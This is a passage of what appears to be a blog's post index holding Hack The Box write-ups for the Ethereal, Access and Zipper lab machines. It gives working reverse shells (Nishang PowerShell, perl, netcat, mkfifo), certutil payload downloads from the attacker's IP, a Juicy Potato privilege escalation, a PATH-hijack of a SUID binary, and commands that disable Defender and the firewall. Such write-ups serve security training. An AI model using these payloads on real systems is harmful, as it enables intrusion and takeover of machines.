bad, there‚Äôs no flag‚Ä¶ let‚Äôs keeping looking.dir c:\\inetpub\\wwwroot$&gt; dir /b c:\\inetpub\\wwwroot(col#)&gt; [+] Receiving data:b'corp'b'default\\x04aspx'b'p1ng'timed outInteresting, there‚Äôs a directory p1ng, let‚Äôs check check it out:Wow, so we didn‚Äôt even need the credentials from the password manager have we known this hidden path.I got really stuck at this point and spent the next several hours trying to find ways to get a proper shell, or find hidden files that would allow me to get unstuck. I didn‚Äôt get far until at some point after I had switched the path invoked by the script to use the unauthenticated page on port 80, I realized that the whoami output I was now getting was different.root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_iis.py $&gt; whoami(col#)&gt; [+] Receiving data:b'iis'Ok, so the webserver on port 80 is not running with the same user as port 8080.After wasting a few more hours, I realized that AppLocker isn‚Äôt enabled for user IIS. I suspected that the outbound ports on the box would be firewalled so I used a boolean blind approach to test various commands. The following payload will ping my machine only if the preceding command has been successfully executed: 127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23.To test this, I first tried a command that I know will work: 127.0.0.1 &amp;&amp; whoami &amp;&amp; ping 10.10.14.23root@darkisland:~# tcpdump -nni tun0 icmptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on tun0, link-type RAW (Raw IP), capture size 262144 bytes21:02:19.817657 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 63, length 4021:02:19.817712 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 63, length 4021:02:20.777578 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 64, length 4021:02:20.777608 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 64, length 4021:02:21.768882 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 65, length 4021:02:21.768933 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 65, length 4021:02:22.919376 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 66, length 4021:02:22.919408 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 66, length 40We are getting pinged so it means the command was executed correctly.Next, our target is certutil.exe so we can use it to download files.First, I tested locally on my Windows machine if running certutil.exe without parameters returns a successful error code. I wanted to do this because I suspected there was an outbound firewall blocking some most ports.Then I verified that certutil.exe is not blocked now that we are running as IIS: 127.0.0.1 &amp;&amp; certutil.exe &amp;&amp; ping 10.10.14.23.21:06:30.214884 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 71, length 4021:06:30.214912 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 71, length 4021:06:31.286151 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 72, length 4021:06:31.286182 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 72, length 40We‚Äôre getting pinged so the certutil.exe command didn‚Äôt error out.While previously looking at the files and programs on the box, I found c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" installed (and it wasn‚Äôt AppLocked for alan user either), so I used this to establish outbound sockets.I modified the existing script to scan for the first 200 ports:    for i in range(1, 200):        time.sleep(2.5)        cmd = \"\\\"c:\\\\program files (x86)\\\\OpenSSL-v1.1.0\\\\bin\\\\openssl.exe\\\" s_client -host 10.10.14.23 -port {}\".format(str(i))        print(cmd)        send(cmd, 1)I used Wireshark to look for incoming SYN packets and started the scan.root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py[...]\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 72\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 73\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 74\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 75[...]\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 135\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 136\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 137\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port 138From the pcap, I identified inbound connections on port 73 and 136.Now, we just need to get netcat uploaded to the server and try to get a proper shell.First, let‚Äôs start an HTTP listener on port 73 to host nc.exe, then issue certutil.exe -urlcache -split -f http://10.10.14.23:73/nc.exe c:\\users\\public\\desktop\\shortcuts\\nc.exeAnd finally, spawn a netcat connection with c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 136We finally got a shell!PrivescOur IIS user has SeImpersonatePrivilege so we can probably do Rotten Potato.c:\\windows\\system32\\inetsrv&gt;whoamiiis apppool\\defaultapppoolc:\\windows\\system32\\inetsrv&gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token             DisabledSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        DisabledSeAuditPrivilege              Generate security audits                  DisabledSeChangeNotifyPrivilege       Bypass traverse checking                  EnabledSeImpersonatePrivilege        Impersonate a client after authentication EnabledSeCreateGlobalPrivilege       Create global objects                     EnabledSeIncreaseWorkingSetPrivilege Increase a process working set            DisabledI used Juicy Potato from Decoder.c:\\windows\\system32\\inetsrv&gt;cd \\users\\public cd \\users\\publicc:\\Users\\Public&gt;cmd /c certutil.exe -urlcache -split -f http://10.10.14.23:73/JuicyPotato.exe JuicyPotato.exe10/10/2018  02:40 AM    &lt;DIR&gt;          .10/10/2018  02:40 AM    &lt;DIR&gt;          ..06/25/2018  03:51 PM    &lt;DIR&gt;          Documents07/03/2018  10:25 PM    &lt;DIR&gt;          Downloads10/10/2018  02:40 AM           347,648 JuicyPotato.exe07/16/2016  02:23 PM    &lt;DIR&gt;          Music07/16/2016  02:23 PM    &lt;DIR&gt;          Pictures07/16/2016  02:23 PM    &lt;DIR&gt;          VideosExecute it, spawning yet another netcat:c:\\Users\\Public&gt;JuicyPotato -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 73\" -t *JuicyPotato -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\users\\public\\desktop\\shortcuts\\nc.exe -e cmd.exe 10.10.14.23 73\" -t *                                                                                Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337......[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKc:\\Users\\Public&gt;We got a shell as nt authority\\system!root@darkisland:~/hackthebox/Machines/Ethereal# nc -lvnp 73listening on [any] 73 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.106] 49877Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&gt;Strange‚Ä¶ we don‚Äôt have read access to the flags even though we are SYSTEM:C:\\Windows\\system32&gt;cd \\users\\jorge\\desktopcd \\users\\jorge\\desktopC:\\Users\\jorge\\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is FAD9-1FD5 Directory of C:\\Users\\jorge\\Desktop07/08/2018  11:20 PM    &lt;DIR&gt;          .07/08/2018  11:20 PM    &lt;DIR&gt;          ..07/04/2018  10:18 PM                32 user.txt               1 File(s)             32 bytes               2 Dir(s)  15,231,598,592 bytes freeC:\\Users\\jorge\\Desktop&gt;type user.txttype user.txtAccess is denied.Looking at the flags, we see that the file is encrypted:PS C:\\users\\jorge\\desktop&gt; get-itemproperty -path user.txt  | Format-list -Property *get-itemproperty -path user.txt  | Format-list -Property *PSPath            : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\jorge\\deskto                    p\\user.txtPSParentPath      : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\jorge\\deskto                    pPSChildName       : user.txt[...]Attributes        : Archive, EncryptedSame thing for the root.txt file in c:\\users\\rupal\\desktop\\root.txtI found some cert and private key files on the D: drivePS D:\\certs&gt; dir    Directory: D:\\certsMode                LastWriteTime         Length Name                          ----                -------------         ------ ----                          -a----         7/1/2018  10:26 PM            772 MyCA.cer                      -a----         7/1/2018  10:26 PM           1196 MyCA.pvkI thought of googling for ways to recover EFS encrypted files but instead I just YOLOed it:Attack plan:  Disable Windows Defender  Disable Firewall  Change Rupal and Jorge‚Äôs passwords  RDP in and steal their shitPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $truePS C:\\&gt; NetSh Advfirewall set allprofiles state offOk.PS C:\\&gt; net users rupal Yoloed1234!net users rupal Yoloed1234!The command completed successfully.PS C:\\&gt; net users jorge Yoloed1234!net users jorge Yoloed1234!The command completed successfully.Sweet, RDP is already running, no need to enable it:PS C:\\&gt; netstat -an                netstat -an                                                           Active Connections                                                      Proto  Local Address          Foreign Address        State  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENINGAt last, we can RDP and get the flags!!"
  },
  
  {
    "title": "Access - Hack The Box",
    "url": "/posts/htb-writeup-access/",
    "categories": "hackthebox, infosec",
    "tags": "telnet, windows, access, outlook, credential manager",
    "date": "2019-03-02 00:00:00 +0800",
    





    
    "snippet": "Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file t...",
    "content": "Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file types without having to spin up a Windows VM. The box creator was kind enough to open up telnet so once we got the low privilege user credentials from the mailbox file we could log on and find the administrator credentials in the Windows Credential Manager.Quick summary  There‚Äôs an encrypted zip file on the FTP server along with a .mdb Access DB backup  The password for the zip file is contained in the backup file  The zip file contains a .PST file with another set of credentials in an email  The credentials give access to Windows through the telnet service  The Windows administrator credentials are stored in Windows Credentials ManagerTools/Blogs used  mdbtools  readpstDetailed stepsPortscanNot many ports open for a Windows box.root@darkisland:~# nmap -F 10.10.10.98Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-30 18:24 EDTNmap scan report for access.htb (10.10.10.98)Host is up (0.018s latency).Not shown: 97 filtered portsPORT   STATE SERVICE21/tcp open  ftp23/tcp open  telnet80/tcp open  httpFTPThe FTP site allows anonymous access and there‚Äôs two interesting files we can download:  backup.mdb  Access Control.ziproot@darkisland:~/hackthebox/Machines/Access# ftp 10.10.10.98Connected to 10.10.10.98.220 Microsoft FTP ServiceName (10.10.10.98:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-23-18  09:16PM       &lt;DIR&gt;          Backups08-24-18  10:00PM       &lt;DIR&gt;          Engineer226 Transfer complete.ftp&gt; cd Backups250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-23-18  09:16PM              5652480 backup.mdb226 Transfer complete.ftp&gt; type binary200 Type set to I.ftp&gt; get backup.mdblocal: backup.mdb remote: backup.mdb200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.5652480 bytes received in 0.94 secs (5.7248 MB/s)ftp&gt; cd ..250 CWD command successful.ftp&gt; cd Engineer250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.08-24-18  01:16AM                10870 Access Control.zip226 Transfer complete.ftp&gt; get \"Access Control.zip\"local: Access Control.zip remote: Access Control.zip200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.10870 bytes received in 0.05 secs (200.3631 kB/s)Finding a password in the Access databaseWe can use mdbtools to view the Access database file:root@darkisland:~/hackthebox/Machines/Access# mdb-tables -1 backup.mdb | grep -i authauth_group_permissionsauth_messageauth_permissionauth_userauth_user_groupsauth_user_user_permissionsauth_groupAUTHDEVICEWe can issue SQL queries with the mdb-sql tool and look for credentials in the auth_user table:root@darkisland:~/hackthebox/Machines/Access# mdb-sql -p backup.mdb 1 =&gt; select * from auth_user2 =&gt; goid\tusername\tpassword\tStatus\tlast_login\tRoleID\tRemark25\tadmin\tadmin\t1\t08/23/18 21:11:47\t26\t27\tengineer\taccess4u@security\t1\t08/23/18 21:13:36\t26\t28\tbackup_admin\tadmin\t1\t08/23/18 21:14:02\t26\t3 Rows retrievedFound the following credentials:  engineer / access4u@securityFinding credentials in PST fileUnzipping the encrypted zip file with password access4u@security:root@darkisland:~/hackthebox/Machines/Access# 7z e access.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)Scanning the drive for archives:1 file, 10870 bytes (11 KiB)Extracting archive: access.zip--Path = access.zipType = zipPhysical Size = 10870    Enter password (will not be echoed):Everything is Ok         Size:       271360Compressed: 10870We can read the PST file content with readpst and it‚Äôll create an mbox file:root@darkisland:~/hackthebox/Machines/Access# readpst access.pstOpening PST file and indexes...Processing Folder \"Deleted Items\"\t\"Access Control\" - 2 items done, 0 items skipped.root@darkisland:~/hackthebox/Machines/Access# ls -ltotal 5820-rw-r--r-- 1 root root    3112 Sep 30 18:36 'Access Control.mbox'Looking in the mbox file we find an email with another set of credentials:root@darkisland:~/hackthebox/Machines/Access# cat 'Access Control.mbox'From \"john@megacorp.com\" Thu Aug 23 19:44:07 2018Status: ROFrom: john@megacorp.com &lt;john@megacorp.com&gt;Subject: MegaCorp Access Control System \"security\" accountTo: 'security@accesscontrolsystems.com'[...]Hi there,The password for the ‚Äúsecurity‚Äù account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.Regards,JohnFound the following credentials:  security / 4Cc3ssC0ntr0llerGetting a shellTelnet is enabled on this box so we can use that last set of credentials and log in to the server:root@darkisland:~/hackthebox/Machines/Access# telnet 10.10.10.98Trying 10.10.10.98...Connected to 10.10.10.98.Escape character is '^]'.Welcome to Microsoft Telnet Service login: securitypassword: 4Cc3ssC0ntr0ller*===============================================================Microsoft Telnet Server.*===============================================================C:\\Users\\security&gt;type desktop\\user.txtff1f3b&lt;redacted&gt;Priv esc with Windows Credentials ManagerOur security user doesn‚Äôt have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn‚Äôt getting any output from the shell so instead I just spawned a reverse shell with Nishang:C:\\Users\\security&gt;powershell -command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159PS C:\\Users\\security&gt; whoamiaccess\\securityPS C:\\Users\\security&gt;PS C:\\Users\\security&gt; vaultcmd /listCurrently loaded vaults:\tVault: security's Vault\tVault Guid:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\tLocation: C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\tStatus: Unlocked\tVisibility: Not hidden\tVault: Windows Vault\tVault Guid:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}\tLocation: C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault\tStatus: Unlocked\tVisibility: Not hiddenAdministrator credentials saved in security user‚Äôs vault:PS C:\\Users\\security&gt; vaultcmd /listcreds:\"Windows Vault\"Credentials in vault: Windows VaultCredential schema: Windows Domain Password CredentialResource: Domain:interactive=ACCESS\\AdministratorIdentity: ACCESS\\AdministratorProperty (schema element id,value): (100,3)I tried using https://github.com/peewpw/Invoke-WCMDump to retrieve the plaintext credentials but that tool only works for ‚ÄúGeneric‚Äù type credentials.So instead I just transferred netcat to the machine and popped a shell this way:PS C:\\Users\\security&gt; certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe****  Online  ****CertUtil: -URLCache command completed successfully.echo c:\\users\\security\\nc.exe -e cmd.exe 10.10.14.23 4444 &gt; shell.batrunas /user:administrator /savecred c:\\users\\security\\shell.batroot@darkisland:~/hackthebox/Machines/Access# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159Microsoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamiaccess\\administratorC:\\Windows\\system32&gt;type c:\\users\\administrator\\desktop\\root.txttype c:\\users\\administrator\\desktop\\root.txt6e1586&lt;redacted&gt;"
  },
  
  {
    "title": "Zipper - Hack The Box",
    "url": "/posts/htb-writeup-zipper/",
    "categories": "hackthebox, infosec",
    "tags": "linux, zabbix, api, suid",
    "date": "2019-02-23 00:00:00 +0800",
    





    
    "snippet": "Zipper was a cool box that mixed some enumeration, API usage and a priv esc using a SUID binary. I had some problems at first getting into Zabbix when I found a possible username but didn‚Äôt think o...",
    "content": "Zipper was a cool box that mixed some enumeration, API usage and a priv esc using a SUID binary. I had some problems at first getting into Zabbix when I found a possible username but didn‚Äôt think of trying the same name as the password. The priv esc was pretty cool, I used ltrace to check which functions are called by the binary and I was able to understand what to do next without having to reverse the binary with IDA or R2.Quick summary  There‚Äôs a Zabbix server running and we can log in as guest and obtain the zapper username  We can‚Äôt log in as zapper on the GUI but we can issue API calls  We can create a script (thru API calls) and get RCE as user zabbix within a container  Then we find the zabbix DB credentials which can also be used to log in as user admin on Zabbix  We can then create a perl reverse shell script and make it run on the zabbix agent (running on the host OS)  The password for user zapper is found in the backup.sh script  We can then su to user zapper and upload our ssh key and get the user flag  The priv esc is a suid binary that executes the systemctl daemon-reload command  We can hijack this command by creating our own systemctl file (with a reverse shell), then modify the path so the suid file executes our file instead of /bin/systemctlDetailed stepsNmaproot@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.108Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-20 15:01 EDTNmap scan report for 10.10.10.108Host is up (0.021s latency).Not shown: 65532 closed portsPORT      STATE SERVICE    VERSION22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works10050/tcp open  tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelZabbix initial enumerationPort 10050 hints to a zabbix installation, since this is the port used by the zabbix agent:root@ragingunicorn:~/hackthebox/Machines# nc -nv 10.10.10.108 10050(UNKNOWN) [10.10.10.108] 10050 (zabbix-agent) openWe found the zabbix installation under the /zabbix directory.The default credentials don‚Äôt work but we can log in as guest.There‚Äôs not much interesting except something about a Zapper's Backup Script:Making API calls with user zapperWe can then log in to Zabbix as user zapper with password zapper (had to guess that part). However, GUI access is not allowed.Zabbix has a REST API so we can use this instead to issue commands to Zabbix.The attack steps are:  Log in to API  Get list of Host IDs  Create a script with a simple reverse shell  Execute script (make sure to specify host ID)AuthenticationBody:Response:We got the following auth token which we‚Äôll re-use for other API calls: e160aa247a18163cfabe3c5645c8500aGet list of Host IDsBody:Response:Create a script for RCEBody:Response:Execute scriptBody:First shell in the containerWe got a shell after executing the script from Zabbix:root@ragingunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 54366/bin/sh: 0: can't access tty; job control turned off$ iduid=103(zabbix) gid=104(zabbix) groups=104(zabbix)$ hostname8e5a23a4dfec$Based on the random hostname and the .dockerenv file in the root directory we can assume we‚Äôre currently in a container:drwxr-xr-x   1 root root 4096 Oct 20 19:27 .drwxr-xr-x   1 root root 4096 Oct 20 19:27 ..-rwxr-xr-x   1 root root    0 Oct 20 19:27 .dockerenvThere‚Äôs not much on this container except the Zabbix configuration file:$ pwd/etc/zabbix$ lsapache.confwebzabbix_server.conf$We can find some credentials in there:$ egrep \"DBUser|DBPassword\" zabbix_server.conf#       For SQLite3 path to database file must be provided. DBUser and DBPassword are ignored.### Option: DBUser# DBUser=DBUser=zabbix### Option: DBPasswordDBPassword=f.YMeMd$pTbpY3-449$  Username: zabbix  Password: f.YMeMd$pTbpY3-449Getting a shell on the host OSWe can log in to the Zabbix admin page with the admin username and f.YMeMd$pTbpY3-449 password.Under the Zabbix host, we can see that there are two hosts and one is running the Zabbix Agent.The agent is running on the host OS while the Zabbix server is running in a container so what we want to do is modify our existing script so its runs on the Zabbix Agent (therefore on the Host OS) instead of the server.We can now get a shell on the Host OS but it‚Äôs not stable and we lose the connection after a few seconds:root@ragingunicorn:~/htb/zipper# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 55348/bin/sh: 0: can't access tty; job control turned off$ hostnamezipper$ iduid=107(zabbix) gid=113(zabbix) groups=113(zabbix)$After trying a few other shells, I found the perl shell works better and is more stable:perl -e 'use Socket;$i=\"10.10.14.23\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'We now have a stable shell:root@ragingunicorn:~/htb/zipper# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 46178/bin/sh: 0: can't access tty; job control turned off$ w 20:56:27 up 20 min,  0 users,  load average: 0.02, 0.03, 0.04USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT$ iduid=107(zabbix) gid=113(zabbix) groups=113(zabbix)$ hostnamezipper$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'zabbix@zipper:/$We still can‚Äôt read user.txt though:cat: user.txt: Permission deniedzabbix@zipper:/home/zapper$But we find a password inside the backup.sh script:zabbix@zipper:/home/zapper/utils$ lsbackup.sh  zabbix-servicezabbix@zipper:/home/zapper/utils$ cat backup.sh#!/bin/bash## Quick script to backup all utilities in this folder to /backups#/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/nullWe can su to zapper using the ZippityDoDah password:echo $?zabbix@zipper:/home/zapper/utils$ su zappersu zapperPassword: ZippityDoDah              Welcome to:‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ïî‚ïù  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù[0] Packages Need To Be Updated[&gt;] Backups:zapper@zipper:~/utils$ cd ..cd ..zapper@zipper:~$ cat user.txtcat user.txtaa29e9&lt;redacted&gt;Priv escThere‚Äôs an interesting SUID file in the utils directory: zabbix-servicezapper@zipper:~/utils$ ls -lls -ltotal 12-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-serviceThe file seems to control one of the zabbix service:zapper@zipper:~/utils$ ./zabbix-service./zabbix-servicestart or stop?: startstartTo see what it does, I used ltrace to check which functions are called:zapper@zipper:~/utils$ ltrace -s 256 ./zabbix-serviceltrace -s 256 ./zabbix-service__libc_start_main(0x45d6ed, 1, 0xbfb57f54, 0x45d840 &lt;unfinished ...&gt;setuid(0)                                        = -1setgid(0)                                        = -1printf(\"start or stop?: \")                       = 16fgets(start or stop?: startstart\"start\\n\", 10, 0xb7f345c0)                 = 0xbfb57e82strcspn(\"start\\n\", \"\\n\")                         = 5strcmp(\"start\", \"start\")                         = 0system(\"systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent\"Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files &lt;no return ...&gt;--- SIGCHLD (Child exited) ---&lt;... system resumed&gt; )                           = 256+++ exited (status 0) +++Based on the ltrace output, we see that the program executes systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent as user root.Because the program doesn‚Äôt execute systemctl using its full path, it is susceptible to hijacking by changing the PATH environment variable.We can write a simple bash script that spawns a reverse shell using a named pipe and name it systemctlzapper@zipper:~/utils$ cat systemctl#!/bin/shrm /tmp/f2;mkfifo /tmp/f2;/bin/cat /tmp/f2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.23 5555 &gt;/tmp/f2zapper@zipper:~/utils$ chmod +x systemctlchmod +x systemctlWe need to use /bin/cat instead of just cat because we‚Äôll remove /bin from the PATH env variableNext, we remove /bin from the PATH and add /home/zapper/utils:zapper@zipper:~/utils$ echo $PATHecho $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gameszapper@zipper:~/utils$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utils&lt;cal/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utilsThen we execute zabbix-service and it spawn a shell as root.zapper@zipper:~/utils$ ./zabbix-service./zabbix-servicestart or stop?: startstart/home/zapper/utils/systemctl: 3: /home/zapper/utils/systemctl: rm: not foundroot@ragingunicorn:~/htb/zipper# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 60846# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(zapper)# cat /root/root.txt/bin/sh: 2: cat: not found# /bin/cat /root/root.txta7c743&lt;redacted&gt;#"
  },
  
  {
    "title": "Giddy - Hack The Box",
    "url": "/posts/htb-writeup-giddy/",
    "categories": "hackthebox, infosec",
    "tags": "sqli, powershell",
    "date": "2019-02-16 00:00:00 +0800",
    





    
    "snippet": "Giddy from Hack the Box is being retired this week so I‚Äôll go over the steps to pwn this box. For this one we need to find an easy SQL injection point in the web application then leverage this to t...",
